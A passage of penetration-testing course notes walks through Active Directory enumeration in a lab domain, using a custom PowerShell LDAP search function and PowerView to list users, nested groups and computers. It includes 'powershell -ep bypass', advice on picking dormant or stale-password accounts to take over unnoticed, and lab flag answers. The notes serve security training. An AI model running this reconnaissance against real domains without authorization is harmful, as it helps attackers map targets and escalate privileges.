LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcateg...
```

Great info to have be we need to take it a little furhter.  When we enum AD we are interested in the attributes of each object, store in the Properties field.

We can store the results we receive in a new var, iterate through each object, and print each prop on its own line via a nested loop as shown.
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```
- Search through AD and filter results based on `samAccountType` of our choice and place it in the `$result` variable.
- Further filter the results based on two foreach loops.
 - The first loop will extract the objects stored in `$result` and place them in the `$obj` var.
 - The second loop extracts all properties for each object and store the info in the `$prop` var, outputing it to terminal.

The `Write-Host` command is not required for the script to function but it does print a line between each object, making the output easier to read.

The script outputs a lot of information, which can become overwhelming depending on the number of domain users.  The listing below shows a partial view of `jeffeadmin` attributes.
```powershell
PS C:\Users\stephanie\Desktop> .\enum.ps1
...
logoncount                     {173}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}
dscorepropagationdata          {9/3/2022 6:25:58 AM, 9/2/2022 11:26:49 PM, 1/1/1601 12:00:00 AM}
usnchanged                     {52775}
instancetype                   {4}
name                           {jeffadmin}
badpasswordtime                {133086594569025897}
pwdlastset                     {133066348088894042}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
lastlogontimestamp             {133080434621989766}
usncreated                     {12821}
objectguid                     {14 171 173 158 0 247 44 76 161 53 112 209 139 172 33 163}
memberof                       {CN=Domain Admins,CN=Users,DC=corp,DC=com, CN=Administrators,CN=Builtin,DC=corp,DC=com}
whencreated                    {9/2/2022 11:26:48 PM}
adspath                        {LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com}
useraccountcontrol             {66048}
cn                             {jeffadmin}
countrycode                    {0}
primarygroupid                 {513}
whenchanged                    {9/19/2022 6:44:22 AM}
lockouttime                    {0}
lastlogon                      {133088312288347545}
distinguishedname              {CN=jeffadmin,CN=Users,DC=corp,DC=com}
admincount                     {1}
samaccountname                 {jeffadmin}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 30 221 116 118 49 27 70 39 209 101 53 106 82 4 0 0}
lastlogoff                     {0}
accountexpires                 {9223372036854775807}
...
```

We can filter based on any prop of any object type.  In the example below we make two changes.  First we change the filter to use the `name` prop to only show info about `jeffadmin`.  Secondly we added `.memberof` to the `$prop` var to only display the groups `jeffadmin` is a member of.
```powershell
PS C:\Users\stephanie\Desktop> .\enum.ps1
CN=Domain Admins,CN=Users,DC=corp,DC=com
CN=Administrators,CN=Builtin,DC=corp,DC=com
```
- Confirming `jeffadmin` is a member of `Domain Admins` group.

We can use this script to enum any object available to us in AD, in the current state it would require us to make further edits to the script itself based on what we want to enum.

We can instead make the script more flexible, allowing us to add the params to the CLI.  We can have the script accept the `samAccountType` we wish to enum as a CLI arg.

There are many ways to accomplish this, we can encapsulate the current functionality of the script into an actual function.
```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
- At the top we declare the function with a name of our choosing.
	- `LDAPSearch`
- We then dynamically obtain the required LDAP path connection string and add it to the `$DirectoryEntry` var.
- The `DirectoryEntry` and our `$LDAPQuery` param is fed into the `DirectorySearcher`
- The search is run and output is added into an array.
 - Displayed in terminal depening on our needs.

To use the function import it into memory.
```powershell
PS C:\Users\stephanie> Import-Module .\function.ps1
```

In PowerShell we can now use the LDAPSearch command to obtain info from AD.  To repear the user enum we did earlier, we can again filter on the `specificAccountType`
```powershell
PS C:\Users\stephanie\Desktop> LDAPSearch -LDAPQuery "(samAccountType=805306368)"

Path                                                         Properties
----                                                         ----------
LDAP://DC1.corp.com/CN=Administrator,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=Guest,CN=Users,DC=corp,DC=com         {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=krbtgt,CN=Users,DC=corp,DC=com        {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=dave,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=stephanie,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=jeff,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com     {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=iis_service,CN=Users,DC=corp,DC=com   {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=pete,CN=Users,DC=corp,DC=com          {logoncount, codepage, objectcateg...
LDAP://DC1.corp.com/CN=jen,CN=Users,DC=corp,DC=com           {logoncount, codepage, objectcateg...


PS C:\Users\stephanie\Desktop> LDAPSearch -LDAPQuery "(name=jeffadmin)"

Path                                                     Properties
----                                                     ----------
LDAP://DC1.corp.com/CN=jeffadmin,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory,...
```

We can also search directly for an Object Class, the component of AD that defines the object type.  Use `onjectClass=group` to list all groups in the domain.
```powershell
PS C:\Users\stephanie> LDAPSearch -LDAPQuery "(objectclass=group)"

...                                                                                 ----------
LDAP://DC1.corp.com/CN=Read-only Domain Controllers,CN=Users,DC=corp,DC=com            {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Enterprise Read-only Domain Controllers,CN=Users,DC=corp,DC=com {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Cloneable Domain Controllers,CN=Users,DC=corp,DC=com            {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Protected Users,CN=Users,DC=corp,DC=com                         {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Key Admins,CN=Users,DC=corp,DC=com                              {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=Enterprise Key Admins,CN=Users,DC=corp,DC=com                   {iscriticalsystemobject, usnchanged, distinguishedname, grouptype...}
LDAP://DC1.corp.com/CN=DnsAdmins,CN=Users,DC=corp,DC=com                               {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=DnsUpdateProxy,CN=Users,DC=corp,DC=com                          {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Sales Department,DC=corp,DC=com                                 {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Management Department,DC=corp,DC=com                            {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Development Department,DC=corp,DC=com                           {usnchanged, distinguishedname, grouptype, whencreated...}
LDAP://DC1.corp.com/CN=Debug,CN=Users,DC=corp,DC=com                                   {usnchanged, distinguishedname, grouptype, whencreated...}
```
- The script enums more groups than `net.exe` including .
	- `Print Operators`
	- `ISS_IUSRS`
 - Etc.
- It enums all objects of AD encluding Domain Local groups.
 - Not just global groups.

To print props and attributes for objects we need to implement the loops we used earlier.  We can do this directly from the PowerShell command.

To enum every group available in the domain and display user memebers we pipe output into a new var and use a `foreach` loop to print each prop of a given group.  This allows us to select the attributes we want, let's focus on `CN` and `member` attributes.
```
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { >> $group.properties | select {$_.cn}, {$_.member} >> }
```

Althought the env is small we still received a lot of output, focus on the three groups we noticed earlier in our enum with `net.exe`.
```...
Sales Department              {CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
Management Department         CN=jen,CN=Users,DC=corp,DC=com
Development Department        {CN=Management Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=dave,CN=Users,DC=corp,DC=com}
...
```

We have expanded teh props for each object, the group object in this case, and printed the member attributes for each group.

We reveal something unexpected, when we enum the `Sales Department` group earlier with `net.exe` we only found two users, `pete` and `stephanie`.  In this case it appears that Development Department is also a member.

Since the output can be somewhat difficult to read we search from groups, but specify `Sales Department` in the query and pipe it to a var in our PS command line.
```powershell
PS C:\Users\stephanie> $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
```

Now that we have one object in our var, we can just print the member attribute directly.
```powershell
PS C:\Users\stephanie\Desktop> $sales.properties.member
CN=Development Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=stephanie,CN=Users,DC=corp,DC=com
```
- The `Development Deparment` is indeed a member of the `Sales Department`
 - Something we missed with `net.exe`
- This is a nested group.
 - Relatively common in AD and scales well.
 - Provides flexible and dynamic membership customization of large AD implementations.
- `net.exe` missed this because it only lists `user` objects, not group objects.
 - It can only display specific attributes, emphasizing the benefits of custom tools.

Now that we know there is a nested group let's enum it.
```powershell
PS C:\Users\stephanie\Desktop> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
PS C:\Users\stephanie\Desktop> $group.properties.member
CN=Management Department,DC=corp,DC=com
CN=pete,CN=Users,DC=corp,DC=com
CN=dave,CN=Users,DC=corp,DC=com
```
- We find another nested group.
	- `Management Department`
```powershell
PS C:\Users\stephanie\Desktop> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Management Department*))"
PS C:\Users\stephanie\Desktop> $group.properties.member
CN=jen,CN=Users,DC=corp,DC=com
```
- After searching through multiple groups we found the end.
 - `jen` is the sole member of `Management Department` group.

Note that `jen` is only part of `Mangement Department` group, but she is also an indirect member Sales and Development groups, because groups inherit from each other.  This is normal behaviour in AD, if misconfigured though users can end up with more privs than inteded!  This can allow attackers to take advantage of the misconfig to expand their reach in the domain.

###### Labs

Start VM Group 2 and log in to CLIENT75 as stephanie. Use the newly developed PowerShell script to enumerate the domain groups, starting with Service Personnel. Unravel the nested groups, then enumerate the attributes for the last direct user member of the nested groups to obtain the flag.
```powershell
PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd .\Desktop\
PS C:\Users\stephanie\Desktop> Import-Module .\func.ps1
PS C:\Users\stephanie\Desktop> LDAPSearch -LDAPQuery "(objectclass=group)"

Path                                                                                   Properties
----                                                                                   ----------
LDAP://DC1.corp.com/CN=Administrators,CN=Builtin,DC=corp,DC=com                        {objectc...
LDAP://DC1.corp.com/CN=Users,CN=Builtin,DC=corp,DC=com                                 {usnchan...
LDAP://DC1.corp.com/CN=Guests,CN=Builtin,DC=corp,DC=com                                {usnchan...
LDAP://DC1.corp.com/CN=Print Operators,CN=Builtin,DC=corp,DC=com                       {iscriti...
LDAP://DC1.corp.com/CN=Backup Operators,CN=Builtin,DC=corp,DC=com                      {iscriti...
LDAP://DC1.corp.com/CN=Replicator,CN=Builtin,DC=corp,DC=com                            {iscriti...
...


### $service = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel))"

PS C:\Users\stephanie\Desktop> $service = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel))"


###  $service.properties.member

PS C:\Users\stephanie\Desktop> $service.properties.member
CN=Billing,CN=Users,DC=corp,DC=com

### $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Billing*))"

PS C:\Users\stephanie\Desktop> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Billing*))"


### $group.properties.member

PS C:\Users\stephanie\Desktop> $group.properties.member
CN=Customer support,CN=Users,DC=corp,DC=com


### $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Customer Support*))"

PS C:\Users\stephanie\Desktop> $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Customer Support*))"
PS C:\Users\stephanie\Desktop> $group.properties.member
CN=michelle,CN=Users,DC=corp,DC=com

### $michelle = LDAPSearch -LDAPQuery "(name=michelle)"

PS C:\Users\stephanie\Desktop> $michelle = LDAPSearch -LDAPQuery "(name=michelle)"
PS C:\Users\stephanie\Desktop> $michelle

Path                                                    Properties
----                                                    ----------
LDAP://DC1.corp.com/CN=michelle,CN=Users,DC=corp,DC=com {logoncount, codepage, objectcategory, ...


PS C:\Users\stephanie\Desktop> $michelle.properties

Name                           Value
----                           -----
logoncount                     {0}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}
description                    {OS{f77d78b7f02ac584618e33dcc4fb96a8}}
usnchanged                     {536764}
instancetype                   {4}
name                           {michelle}
badpasswordtime                {0}
pwdlastset                     {133461044726932397}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
usncreated                     {536760}
objectguid                     {251 47 15 239 86 187 130 78 173 245 93 182 134 121 118 103}
memberof                       {CN=Customer support,CN=Users,DC=corp,DC=com}
whencreated                    {12/3/2023 7:14:32 PM}
adspath                        {LDAP://DC1.corp.com/CN=michelle,CN=Users,DC=corp,DC=com}
useraccountcontrol             {512}
cn                             {michelle}
countrycode                    {0}
primarygroupid                 {513}
whenchanged                    {12/3/2023 7:14:32 PM}
dscorepropagationdata          {1/1/1601 12:00:00 AM}
lastlogon                      {0}
distinguishedname              {CN=michelle,CN=Users,DC=corp,DC=com}
samaccountname                 {michelle}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 30 221 116 118 49 27 70 39 209 101 53 ...
lastlogoff                     {0}
accountexpires                 {9223372036854775807}
```


##### AD Enumeration with PowerView

So far we have only focused on enumerating users and groups.  The tools we have used so far have given us a basic understanding of how to communicate with AD and[PowerView](https://powersploit.readthedocs.io/en/latest/Recon/) retrieve information, other researchers have created more advanced tools for this purpose.

[PowerView](https://powersploit.readthedocs.io/en/latest/Recon/) PowerShell script is a popular option including many functions to improve the effectiveness of enumeration.

Let's get acquainted with PowerView by walking through our prior enumeration steps.  PowerView is already installed in `C:\Tools` dir of CLIENT75.  To use it we must first import it to memory.
```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
```

With the module imported we can explore the available commands.  Refer to the linked reference for a list of all commands.

Start by running `Get-NetDomain` which gives us basic information about the domain (where we previously used GetCurrentDomain).
```powershell
PS C:\Users\stephanie> Get-NetDomain


Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```
- PowerView uses .NET classes to obtain LDAP path and comm with AD.

Let's get a list of all users in the domain with `Get-Netuser`
```powershell
PS C:\Users\stephanie> Get-NetUser


logoncount             : 546
badpasswordtime        : 3/1/2023 3:18:15 AM
description            : Built-in account for administering the computer/domain
distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 12/3/2023 11:35:59 AM
name                   : Administrator
objectsid              : S-1-5-21-1987370270-658905905-1781884369-500
samaccountname         : Administrator
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 12/3/2023 7:35:59 PM
instancetype           : 4
objectguid             : e5591000-080d-44c4-89c8-b06574a14d85
lastlogon              : 12/3/2023 12:29:51 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata  : {9/2/2022 11:25:58 PM, 9/2/2022 11:25:58 PM, 9/2/2022 11:10:49 PM,
                         1/1/1601 6:12:16 PM}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=corp,DC=com, CN=Domain
                         Admins,CN=Users,DC=corp,DC=com, CN=Enterprise
                         Admins,CN=Users,DC=corp,DC=com, CN=Schema
                         Admins,CN=Users,DC=corp,DC=com...}
whencreated            : 9/2/2022 11:08:27 PM
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : Administrator
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 8/16/2022 5:27:22 PM
usnchanged             : 536678

pwdlastset             : 12/31/1600 4:00:00 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
description            : Built-in account for guest access to the computer/domain
distinguishedname      : CN=Guest,CN=Users,DC=corp,DC=com
objectclass            : {top, person, organizationalPerson, user}
name                   : Guest
objectsid              : S-1-5-21-1987370270-658905905-1781884369-501
samaccountname         : Guest
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 9/2/2022 11:08:27 PM
instancetype           : 4
objectguid             : 3d22dfde-246a-4055-9b22-605ca28ddb35
lastlogon              : 12/31/1600 4:00:00 PM
...
```
- `Get-NetUser` automatically enumerates all attributes on the user objects.
 - Producing a lot of info.

In our script we used loops to print certain attributes based on the info obtained.  With PowerView we can pipe the output into `select`, where we can choose specific attributes.

The `cn` attribute holds the username of the user, pipe the output to `select` and choose the `cn` attribute.
```powershell
PS C:\Users\stephanie> Get-NetUser | select cn

cn
--
Administrator
Guest
krbtgt
dave
stephanie
jeff
jeffadmin
iis_service
pete
jen
```
- Produced a cleaned up list of users in the domain.

There are many interesting attributes to search for when enumerating AD.  If a user is dormant, they have not changed their password or logged in recently, we will draw less attention if we take over the account during an engagement.  Also, if a user hasn't changed their password since a recent password policy update, their password may be weaker than the current policy making it weaker to password attacks.

This can be easily investigated, run `Get-NetUser` again, piping the output to `select` and extracting the following attributes.
```powershell
PS C:\Users\stephanie> Get-NetUser | select cn,pwdlastset,lastlogon

cn            pwdlastset            lastlogon
--            ----------            ---------
Administrator 8/16/2022 5:27:22 PM  12/3/2023 12:39:51 PM
Guest         12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM
krbtgt        9/2/2022 4:10:48 PM   12/31/1600 4:00:00 PM
dave          9/7/2022 9:54:57 AM   12/3/2023 12:44:42 PM
stephanie     9/2/2022 4:23:38 PM   12/3/2023 12:13:19 PM
jeff          9/2/2022 4:27:20 PM   9/27/2023 3:42:05 AM
jeffadmin     9/2/2022 4:26:48 PM   9/27/2023 6:08:57 AM
iis_service   9/7/2022 5:38:43 AM   3/1/2023 3:40:02 AM
pete          9/6/2022 12:41:54 PM  2/1/2023 2:42:42 AM
jen           9/6/2022 12:43:01 PM  3/8/2023 11:39:06 PM
```
- Generates a nice list showing of users.
 - When users last changes their passwords.
 - Last user login.

We can also use it to enumerate groups.
```powershell
PS C:\Users\stephanie> Get-NetGroup | select cn

cn
--
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Incoming Forest Trust Builders
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
Sales Department
Management Department
Development Department
Debug
```

We will not go through the process of traversing nested groups, but let's investigate `Sales Department` using `Get-NetGroup` and pipe the output into `select member`.
```powershell
PS C:\Users\stephanie> Get-NetGroup "Sales Department" | select member

member
------
{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Use...
```
- We could easily follow the nested groups with this method.

We have recreated the functions of our prior script and are ready to explore more attributes and enum techniques.

###### Labs

Start VM Group 1 and log in to CLIENT75 as stephanie. Import the PowerView script to memory and repeat the enumeration steps outlined in this section. Which command can we use with PowerView to list the domain groups?
```Get-NetGroup
```

Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to enumerate the modified corp.com domain. Which new user is a part of the Domain Admins group?
```
### VM Group 1

PS C:\Users\stephanie> Get-NetGroup "Domain Admins" | select member

member
------
{CN=jeffadmin,CN=Users,DC=corp,DC=com, CN=Administrator,CN=Users,DC=corp,DC=com}

### VM Group 2

PS C:\Users\stephanie> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\stephanie> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-NetGroup "Domain Admins" | select member

member
------
{CN=nathalie,CN=Users,DC=corp,DC=com, CN=jeffadmin,CN=Users,DC=corp,DC=com, CN=Administrator,CN...


### nathalie
```

Continue enumerating the corp.com domain in VM Group 2. Enumerate which Office the user fred is working in to obtain the flag.
```powershell
PS C:\Tools> Get-NetUser | select cn,physicaldeliveryofficename

cn            physicaldeliveryofficename
--            --------------------------
Administrator
Guest
krbtgt
dave
stephanie
jeff
jeffadmin
iis_service
pete
jen
nathalie
fred          OS{072d7a88c41d71a63f44745f63790d9e}
bob
robert
dennis
michelle
```


#### 21.3 Manual Enumeration - Expanding our Repertoire

- Enumerate Operating Systems.
- Enumerate permissions and logged on users.
- Enumerate through Service Principal Names.
- Enumerate Object Permissions.
- Explore Domain Shares.

##### Enumerating Operating Systems

In a typical pentest we use various recon tools to detect the OS a client or server is running.  We can also enumerate this from Active Directory.

Use the `Get-NetComputer` PowerView command to enum the computer objects in the domain.
```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-NetComputer


pwdlastset                    : 11/13/2023 5:41:00 AM
logoncount                    : 707
msds-generationid             : {45, 18, 54, 151...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura
                                tion,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 12/3/2023 1:40:41 PM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 12/3/2023 9:40:41 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC1,CN=Topology,CN=Domain System
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=corp,DC=com
objectguid                    : 8db9e06d-068f-41bc-945d-221622bca952
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : {9/2/2022 11:10:48 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/DC1, TERMSRV/DC1.corp.com,
                                Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.corp.com,
                                ldap/DC1.corp.com/ForestDnsZones.corp.com...}
usncreated                    : 12293
lastlogon                     : 12/3/2023 1:40:43 PM
badpwdcount                   : 0
cn                            : DC1
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 9/2/2022 11:10:48 PM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 536679
ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
dnshostname                   : DC1.corp.com

logoncount                    : 496
badpasswordtime               : 9/26/2023 2:04:51 AM
distinguishedname             : CN=web04,CN=Computers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 12/3/2023 1:40:59 PM
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1112
samaccountname                : WEB04$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : web04
accountexpires                : NEVER
whenchanged                   : 12/3/2023 9:40:59 PM
instancetype                  : 4
usncreated                    : 20506
objectguid                    : 2e01aeed-b4a6-40c4-9753-dc4e309f9021
operatingsystem               : Windows Server 2022 Standard
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : {9/5/2022 3:58:26 PM, 1/1/1601 12:00:00 AM}
serviceprincipalname          : {HOST/web04.corp.com, HOST/web04, TERMSRV/WEB04,
                                TERMSRV/web04.corp.com...}
lastlogon                     : 12/3/2023 1:42:42 PM
iscriticalsystemobject        : False
usnchanged                    : 536693
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 9/5/2022 3:21:29 PM
primarygroupid                : 515
pwdlastset                    : 11/13/2023 5:41:33 AM
msds-supportedencryptiontypes : 28
name                          : web04
dnshostname                   : web04.corp.com

logoncount                    : 517
badpasswordtime               : 9/26/2023 2:05:40 AM
distinguishedname             : CN=files04,CN=Computers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 12/3/2023 1:40:59 PM
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1118
samaccountname                : FILES04$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : files04
accountexpires                : NEVER
whenchanged                   : 12/3/2023 9:40:59 PM
instancetype                  : 4
usncreated                    : 20605
objectguid                    : 7f5c6a2c-faf7-49dd-896d-6980b596e58f
operatingsystem               : Windows Server 2022 Standard
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {TERMSRV/FILES04, TERMSRV/FILES04.corp.com, WSMAN/FILES04,
                                WSMAN/FILES04.corp.com...}
lastlogon                     : 12/3/2023 1:42:42 PM
iscriticalsystemobject        : False
usnchanged                    : 536694
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 9/5/2022 3:59:41 PM
primarygroupid                : 515
pwdlastset                    : 9/26/2023 2:05:40 AM
msds-supportedencryptiontypes : 28
name                          : files04
dnshostname                   : FILES04.corp.com

logoncount                    : 527
badpasswordtime               : 9/26/2023 2:12:00 AM
distinguishedname             : CN=client74,CN=Computers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 12/3/2023 1:41:08 PM
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1121
samaccountname                : CLIENT74$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : client74
accountexpires                : NEVER
whenchanged                   : 12/3/2023 9:41:08 PM
instancetype                  : 4
usncreated                    : 20693
objectguid                    : 43fc4bad-f63f-45bd-849c-93e8ab948ad6
operatingsystem               : Windows 11 Pro
operatingsystemversion        : 10.0 (22000)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {WSMAN/client74, WSMAN/client74.corp.com, TERMSRV/CLIENT74,
                                TERMSRV/client74.corp.com...}
lastlogon                     : 12/3/2023 1:41:39 PM
iscriticalsystemobject        : False
usnchanged                    : 536733
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 9/5/2022 4:21:00 PM
primarygroupid                : 515
pwdlastset                    : 9/26/2023 2:12:00 AM
msds-supportedencryptiontypes : 28
name                          : client74
dnshostname                   : client74.corp.com

logoncount                    : 638
badpasswordtime               : 2/15/2023 1:52:28 AM
distinguishedname             : CN=client75,CN=Computers,DC=corp,DC=com
